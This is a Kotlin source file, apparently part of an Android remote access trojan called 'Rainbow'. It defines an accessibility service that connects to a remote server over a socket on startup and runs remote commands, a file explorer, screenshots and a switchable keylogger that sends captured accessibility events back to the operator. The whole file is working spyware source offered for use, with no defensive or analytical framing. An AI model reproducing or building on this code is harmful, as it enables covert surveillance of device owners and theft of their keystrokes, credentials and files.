package abyssalarmy.rainbow

import abyssalarmy.rainbow.RainbowHandler.*
import abyssalarmy.rainbow.RainbowNetwork.RainbowSocket
import android.accessibilityservice.AccessibilityService
import android.app.Notification
import android.content.Context
import android.os.Build
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import android.util.Log
import android.view.accessibility.AccessibilityEvent


class RainbowAccessibilityService : AccessibilityService() {

    lateinit var socket: RainbowSocket
    lateinit var keyloggerHandler: RainbowKeyloggerHandler
    private var keyloggerState = false

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (keyloggerState) {
            if (event != null) {
                keyloggerHandler.handle(event)
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        socket = RainbowSocket(this)
        socket.connect()
        val commendHandler = RainbowCommendHandler(this, socket)
        val fileExploreHandler = RainbowFileExploreHandler(this, socket)
        val pingHandler = RainbowPingHandler(socket)
        keyloggerHandler = RainbowKeyloggerHandler(socket)
        commendHandler.handle()
        commendHandler.onScreenshot = {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT)
            } else {
                socket.sendMessage("Screenshot in only allowed in SDK 28 or higher")
            }
        }
        commendHandler.onKeylogger = {
            keyloggerState = it
            socket.sendMessage("Keylogger is ${if (it) "ON" else "OFF"}")
        }
        fileExploreHandler.handle()
        pingHandler.handle()
    }

    override fun onInterrupt() {}
}